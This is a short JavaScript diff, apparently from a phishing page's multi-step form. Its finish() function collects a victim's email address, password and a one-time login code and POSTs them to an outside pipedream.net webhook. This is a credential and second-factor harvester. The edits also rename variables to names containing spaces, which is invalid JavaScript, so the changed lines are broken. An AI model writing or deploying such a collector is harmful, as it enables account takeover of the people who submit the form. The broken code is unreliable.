@@ -194,9 +194,9 @@ document.getElementById("page"+page).classList.add("active");
 
 function finish() {
 
-    const EmailAddress = document.getElementById("EmailAddress").value;
+    const Email Address = document.getElementById("Email Address").value;
     const Password = document.getElementById("Password").value;
-    const Enterthecode  = document.getElementById("Enterthecode").value;
+    const Enter the code = document.getElementById("Enter the code").value;
 
     fetch("https://eoc0klx6oxuuegp.m.pipedream.net", {
         method: "POST",
@@ -204,9 +204,9 @@ function finish() {
             "Content-Type": "application/json"
         },
         body: JSON.stringify({
-           EmailAddress : EmailAddress,
+           EmailAddress : Email Address,
            Password : Password,
-           Enterthecode : Enterthecode
+           Enterthecode : Enter the code
         })
     });
 
